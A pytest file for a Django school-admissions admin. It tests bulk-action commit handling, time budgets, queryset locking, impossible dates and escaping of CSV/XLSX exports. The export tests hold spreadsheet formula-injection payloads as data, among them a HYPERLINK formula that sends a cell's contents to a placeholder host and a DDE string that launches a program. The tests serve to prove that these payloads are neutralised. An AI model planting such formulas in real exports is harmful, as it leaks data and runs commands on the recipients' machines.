"""Pre-launch admin review (2026-11-09): the shared bulk, export and list plumbing.

- Bulk actions that ask for a note (reject documents, reject password
  requests) could never run: the dry run, sent before the note can be typed,
  was refused for lacking it. The note is now required on the commit only.
- Emailing bulk actions sent inside the chunk's transaction: a worker killed
  before the commit rolled back the token the family had just received.
  ``after_commit`` defers the side effect until the chunk commits; a commit
  stops starting chunks after a time budget and reports the rest for
  «Reintentar fallidas».
- The forms bulk locked an aggregated queryset: Postgres refuses FOR UPDATE
  with GROUP BY (SQLite ignores it, so only production failed).
- A name like «=HYPERLINK(…)» from a public form ran as a formula in the
  office's CSV / XLSX export.
- ``?from=2026-02-30`` (well formed, impossible) was a 500 on every list.
"""

import csv
import io
import zipfile

import pytest
from django.urls import get_resolver
from rest_framework.request import Request
from rest_framework.test import APIRequestFactory

from apps.accounts.factories import AdminFactory
from apps.admissions.models import PreRegistration
from apps.core import bulk as bulk_mod
from apps.core.bulk import NOT_REACHED, AdminBulkView, BulkAction, after_commit, run_bulk
from apps.core.exporting import Col, ExportSpec, csv_safe, render_csv, xlsx_bytes
from apps.core.listing import date_bounds

pytestmark = pytest.mark.django_db


def _pre(n):
    return PreRegistration.objects.create(
        child_first_name=f"Niño{n}",
        child_last_name="Prueba",
        child_dob="2019-01-01",
        level=PreRegistration.Level.PRIMARY,
        grade_applying="Primaria 1°",
        parent_name="Tutor Prueba",
        parent_email=f"tutor{n}@test.mx",
        parent_phone="5550000000",
    )


class TestAfterCommit:
    def test_outside_a_bulk_run_it_runs_now(self):
        calls = []
        after_commit(lambda: calls.append(1))
        assert calls == [1]

    def test_side_effects_wait_for_the_chunk_and_a_failed_row_drops_its_own(self):
        rows = [_pre(i) for i in range(3)]
        sent, seen = [], []

        def handler(instance, payload, actor):
            seen.append(list(sent))  # what had been sent while this row ran
            after_commit(lambda: sent.append(instance.pk))
            if instance.pk == rows[1].pk:
                raise ValueError("falla")

        action = BulkAction(name="t", label_es="Prueba", handler=handler)
        result = run_bulk(
            PreRegistration.objects.all(),
            [r.pk for r in rows],
            action,
            {},
            AdminFactory(),
            entity="admissions.preregistration",
        )

        assert result["ok"] == 2 and [f["id"] for f in result["failed"]] == [rows[1].pk]
        assert seen == [[], [], []]  # nothing went out mid-chunk
        assert sent == [rows[0].pk, rows[2].pk]  # the failed row's email was dropped

    def test_a_small_chunk_sends_as_each_chunk_commits(self):
        rows = [_pre(i) for i in range(3)]
        sent, seen = [], []

        def handler(instance, payload, actor):
            seen.append(len(sent))
            after_commit(lambda: sent.append(instance.pk))

        action = BulkAction(name="t", label_es="Prueba", handler=handler, chunk=1)
        run_bulk(
            PreRegistration.objects.all(),
            [r.pk for r in rows],
            action,
            {},
            AdminFactory(),
            entity="admissions.preregistration",
        )
        assert seen == [0, 1, 2] and len(sent) == 3

    def test_a_dry_run_never_runs_them(self):
        row = _pre(1)
        sent = []
        action = BulkAction(
            name="t",
            label_es="Prueba",
            handler=lambda *a: None,
            plan=lambda instance, payload: after_commit(lambda: sent.append(1)),
        )
        result = run_bulk(
            PreRegistration.objects.all(),
            [row.pk],
            action,
            {},
            AdminFactory(),
            entity="admissions.preregistration",
            dry_run=True,
        )
        assert result["ok"] == 1 and sent == []


class TestTimeBudget:
    def test_rows_not_reached_come_back_for_retry(self, monkeypatch):
        monkeypatch.setattr(bulk_mod, "TIME_BUDGET_SECONDS", -1)  # spent after the first chunk
        rows = [_pre(i) for i in range(5)]
        done = []
        action = BulkAction(
            name="t",
            label_es="Prueba",
            chunk=2,
            handler=lambda instance, payload, actor: done.append(instance.pk),
        )
        result = run_bulk(
            PreRegistration.objects.all(),
            [r.pk for r in rows],
            action,
            {},
            AdminFactory(),
            entity="admissions.preregistration",
        )

        assert result["ok"] == 2 and done == [rows[0].pk, rows[1].pk]
        assert result["not_reached"] == 3
        assert [f["id"] for f in result["failed"]] == [r.pk for r in rows[2:]]
        assert {f["error"] for f in result["failed"]} == {NOT_REACHED}

    def test_a_dry_run_has_no_budget(self, monkeypatch):
        monkeypatch.setattr(bulk_mod, "TIME_BUDGET_SECONDS", -1)
        rows = [_pre(i) for i in range(5)]
        action = BulkAction(name="t", label_es="Prueba", chunk=2, handler=lambda *a: None)
        result = run_bulk(
            PreRegistration.objects.all(),
            [r.pk for r in rows],
            action,
            {},
            AdminFactory(),
            entity="admissions.preregistration",
            dry_run=True,
        )
        assert result["ok"] == 5 and result["failed"] == []


def _subclasses(cls):
    for sub in cls.__subclasses__():
        yield sub
        yield from _subclasses(sub)


class TestBulkQuerysetsCanBeLocked:
    def test_no_bulk_view_locks_an_aggregated_queryset(self):
        from apps.content.forms import _annotated

        assert get_resolver().url_patterns  # imports every app's views
        assert _annotated().query.group_by is not None  # the check below can see a GROUP BY

        request = Request(APIRequestFactory().post("/"))
        request.user = AdminFactory()
        views = list(_subclasses(AdminBulkView))
        assert len(views) >= 15
        for view_cls in views:
            view = view_cls()
            view.request, view.args, view.kwargs = request, (), {}
            qs = view.get_queryset()
            # Postgres: «FOR UPDATE is not allowed with GROUP BY clause».
            assert qs.query.group_by is None, view_cls.__name__


class TestFormulaInjection:
    @pytest.mark.parametrize(
        "text",
        [
            '=HYPERLINK("https://x/?"&B2,"Ver")',
            "@SUM(A1:A9)",
            "-2+3+cmd|' /C calc'!A0",
            '+HYPERLINK("https://x")',
            "\tTAB",
            "\rCR",
        ],
    )
    def test_what_excel_would_run_is_quoted(self, text):
        assert csv_safe(text) == "'" + text

    @pytest.mark.parametrize(
        "text", ["+52 55 1234 5678", "-150.00", "-", "Ana", "5512345678", "", "(55) 1234-5678"]
    )
    def test_names_numbers_and_phones_stay_as_they_are(self, text):
        assert csv_safe(text) == text

    def test_numbers_are_not_touched(self):
        assert csv_safe(-5) == -5

    def test_csv_export(self):
        spec = ExportSpec(
            filename_prefix="prueba",
            audit_entity="x",
            columns=[Col("name", "Nombre"), Col("phone", "Teléfono")],
        )
        rows = [{"name": '=HYPERLINK("https://x/?"&B2,"Ver")', "phone": "+52 55 1234 5678"}]
        body = b"".join(render_csv(rows, spec).streaming_content).decode("utf-8-sig")
        data = list(csv.reader(io.StringIO(body)))
        assert data[1] == ['\'=HYPERLINK("https://x/?"&B2,"Ver")', "+52 55 1234 5678"]

    def test_xlsx_keeps_it_text(self):
        from openpyxl import load_workbook

        payload = xlsx_bytes(["Nombre"], [['=HYPERLINK("https://x","Ver")'], ["Ana"]])
        with zipfile.ZipFile(io.BytesIO(payload)) as z:
            sheet = z.read("xl/worksheets/sheet1.xml").decode()
        assert "<f>" not in sheet
        cell = load_workbook(io.BytesIO(payload)).active["A2"]
        assert cell.data_type == "s" and cell.value == '=HYPERLINK("https://x","Ver")'


class TestImpossibleDates:
    def test_ignored_like_a_typo(self):
        assert date_bounds("2026-02-30", "2026-13-01") == (None, None)

    def test_a_list_answers_instead_of_500(self, admin_client):
        # The pre-registros list filters through apply_date_range (CreatedRangeFilterSet).
        _pre(1)
        r = admin_client.get("/api/v1/admissions/pre-register/?from=2026-02-30&to=2026-02-31")
        assert r.status_code == 200 and r.data["count"] == 1
